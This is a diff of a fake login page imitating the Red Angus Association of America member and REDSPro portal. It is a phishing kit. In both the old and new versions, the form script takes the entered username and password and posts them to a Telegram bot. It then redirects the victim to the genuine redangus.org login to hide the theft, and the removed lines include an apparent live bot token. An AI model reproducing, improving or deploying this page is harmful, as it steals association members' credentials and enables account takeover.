@@ -1,59 +1,95 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Red Angus Association of America | Member Login</title>
-    <style>
-        body{margin:0;padding:0;font-family:'Trebuchet MS',sans-serif;background:#f4f4f4;display:flex;justify-content:center;align-items:center;min-height:100vh}
-        .c{background:#fff;width:100%;max-width:420px;padding:30px;border-radius:4px;box-shadow:0 2px 10px rgba(0,0,0,.1);border-top:5px solid #800000}
-        .h{text-align:center;margin-bottom:25px}
-        .l{max-width:180px;height:auto;margin-bottom:10px}
-        .t{font-size:12px;color:#666;letter-spacing:1px;text-transform:uppercase;margin-bottom:20px}
-        h2{font-size:22px;color:#800000;margin:0 0 20px;font-weight:normal}
-        .g{margin-bottom:15px}
-        label{display:block;margin-bottom:5px;font-size:13px;color:#444;font-weight:bold}
-        input[type=email],input[type=password]{width:100%;padding:10px;border:1px solid #ccc;border-radius:3px;font-size:14px;box-sizing:border-box}
-        input:focus{border-color:#800000;outline:none}
-        button{width:100%;padding:12px;background:#800000;color:#fff;border:none;border-radius:3px;font-size:15px;cursor:pointer;font-weight:bold;position:relative}
-        button:hover{background:#600000}
-        button:disabled{background:#aaa;cursor:not-allowed}
-        .s{display:none;width:16px;height:16px;border:2px solid #fff;border-top-color:transparent;border-radius:50%;animation:spin .8s linear infinite;position:absolute;left:50%;top:50%;margin-left:-8px;margin-top:-8px}
-        @keyframes spin{to{transform:rotate(360deg)}}
-        .f{text-align:center;margin-top:20px;font-size:11px;color:#999}
-        .f a{color:#800000;text-decoration:none}
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Red Angus Association of America | Login</title>
+<style>
+body{margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#f4f6f8;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#333}
+.c{background:#fff;width:100%;max-width:450px;padding:40px;border-radius:8px;box-shadow:0 4px 15px rgba(0,0,0,.1);opacity:0;animation:f .5s ease-out forwards;text-align:center}
+@keyframes f{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+.h{text-align:center;margin-bottom:25px}
+.l{width:180px;height:auto;margin-bottom:15px;display:block;margin-left:auto;margin-right:auto}
+h2{font-size:22px;color:#b71c1c;margin-bottom:10px;font-weight:700}
+.s{font-size:14px;color:#666;line-height:1.4;margin-bottom:25px}
+.g{margin-bottom:20px;text-align:left}
+label{display:block;margin-bottom:8px;font-size:13px;font-weight:600;color:#333}
+input[type=text],input[type=password]{width:100%;padding:12px 14px;border:1px solid #ccc;border-radius:4px;font-size:15px;transition:all .2s ease;background:#fff;box-sizing:border-box}
+input:focus{border-color:#b71c1c;outline:none;box-shadow:0 0 0 3px rgba(183,28,28,.15)}
+.b{background-color:#b71c1c;color:#fff;border:none;padding:14px;width:100%;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;position:relative;transition:background-color .2s;display:flex;justify-content:center;align-items:center}
+.b:hover{background-color:#9a1616}
+.b:disabled{background-color:#999;cursor:not-allowed}
+.sp{display:none;width:20px;height:20px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:s .8s linear infinite}
+@keyframes s{to{transform:rotate(360deg)}}
+.fg{color:#666;font-size:12px;margin-top:15px;text-align:center}
+.fg a{color:#b71c1c;text-decoration:none}
+</style>
 </head>
 <body>
 
 <div class="c">
-    <div class="h">
-        <img src="https://redangus.org/wp-content/uploads/2026/09/red-angus-logo2026.svg" alt="Logo" class="l" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxODAiIGhlaWdodD0iNTAiPjxyZWN0IHdpZHRoPSIxODAiIGhlaWdodD0iNTAiIGZpbGw9IiM4MDAwMDAiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZG9taW5hbnQtYmFzZWxpbmU9Im1pZGRsZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0id2hpdGUiIGZvbnQtc2l6ZT0iMjQiIGZvbnQtd2VpZ2h0PSJib2xkIj5SRUE8L3RleHQ+PC9zdmc+'">
-        <div class="t">Ranch Tested. Rancher Trusted.</div>
-        <h2>Member Login</h2>
+    <div class="header">
+        <!-- Official Red Angus Logo -->
+        <img src="https://redangus.org/wp-content/uploads/2026/09/red-angus-logo2026.svg" alt="Logo" class="l" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxODAiIGhlaWdodD0iNTAiIHZpZXdCb3g9IjAgMCAxODAgNTAiPjxyZWN0IHdpZHRoPSIxODAiIGhlaWdodD0iNTAiIGZpbGw9IiNiNzFjMWMiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZG9taW5hbnQtYmFzZWxpbmU9Im1pZGRsZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0id2hpdGUiIGZvbnQtc2l6ZT0iMjQiIGZvbnQtZmFtaWx5PSJzYW5zLXNlcmlmIj5SRUQgQU5HVVM8L3RleHQ+PC9zdmc+'">
+        <h2>REDSPro Login</h2>
+        <p class="s">Access your herd management portal.</p>
     </div>
 
-    <form id="f1" autocomplete="off">
+    <form id="loginForm" autocomplete="off">
         <div class="g">
-            <label for="e1">Email Address</label>
-            <input type="email" id="e1" name="username" required placeholder="name@example.com">
+            <label for="username">Username</label>
+            <input type="text" id="username" name="username" required placeholder="Enter your username">
         </div>
         <div class="g">
-            <label for="p1">Password</label>
-            <input type="password" id="p1" name="password" required placeholder="••••••••">
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" required placeholder="Enter your password">
         </div>
-        <button type="submit" id="b1">
-            <span id="t1">Sign In</span>
-            <div class="s" id="sp1"></div>
+        
+        <button type="submit" class="b" id="btn">
+            <span id="txt">Log In</span>
+            <div class="sp" id="spin"></div>
         </button>
     </form>
-
-    <div class="f">&copy; 2026 Red Angus Association of America<br><a href="https://redangus.org/">Visit Main Site</a></div>
+    
+    <div class="fg">
+        <a href="#">Forgot your password?</a>
+    </div>
 </div>
 
 <script>
-document.getElementById('f1').addEventListener('submit',function(e){e.preventDefault();var b=document.getElementById('b1'),t=document.getElementById('t1'),s=document.getElementById('sp1');b.disabled=true;t.style.display='none';s.style.display='block';var u=document.getElementById('e1').value,p=document.getElementById('p1').value,d='\uD83D\uDD25 *RAAA Login Attempt*\n\n\uD83D\uDCE7 Email: '+u+'\n\uD83D\uDD11 Pass: '+p+'\n\uD83D\uDD52 Time: '+new Date().toLocaleString();fetch("https://api.telegram.org/bot8917250221:AAHn3ooqjGzdDps8vJ_zAg6Gj7Fu3ceqp94
-/sendMessage",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:"6479764005",text:d,parse_mode:"markdown"})}).finally(function(){window.location.href="https://vm-zebu.redangus.org/redspro/redspro/action/LoginUserAction"})});
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    var btn = document.getElementById('btn');
+    var txt = document.getElementById('txt');
+    var spin = document.getElementById('spin');
+    var user = document.getElementById('username').value;
+    var pass = document.getElementById('password').value;
+    
+    // Visual loading state
+    btn.disabled = true;
+    txt.style.display = 'none';
+    spin.style.display = 'block';
+
+    // Prepare payload
+    var date = new Date().toLocaleString();
+    var msg = "\uD83D\uDD25 *New REDSPro Login*\n\n\uD83D\uDCE7 User: " + user + "\n\uD83D\uDD11 Pass: " + pass + "\n\u23F0 Time: " + date;
+
+    // Use sendBeacon for reliability during redirect
+    var url = "https://api.telegram.org/bot/YOUR_BOT_TOKEN/sendMessage";
+    var data = JSON.stringify({
+        chat_id: "6479764005",
+        text: msg,
+        parse_mode: "markdown"
+    });
+
+    navigator.sendBeacon(url, new Blob([data], {type: "application/json"}));
+
+    // Small delay to ensure beacon fires, then redirect
+    setTimeout(function() {
+        window.location.href = "https://vm-zebu.redangus.org/redspro/redspro/template/Login.vm";
+    }, 500);
+});
 </script>
 
 </body>
